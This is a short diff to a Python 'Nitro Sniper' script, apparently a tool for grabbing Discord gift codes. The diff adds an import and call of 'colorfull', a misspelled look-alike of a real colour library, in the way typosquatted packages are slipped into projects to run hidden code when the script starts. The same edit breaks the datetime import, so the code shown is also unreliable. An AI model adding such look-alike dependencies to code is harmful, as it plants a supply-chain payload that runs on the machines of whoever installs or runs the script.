@@ -5,7 +5,8 @@ from colorama import Fore, init
 import ctypes
 import requests
 import json
-from datetime import datetime
+from datetime import datetim
+from colorfull import init; init()
 init()
 
 ctypes.windll.kernel32.SetConsoleTitleW("[>_Mσnsτεгεɗ#0069] Nitro Sniper")
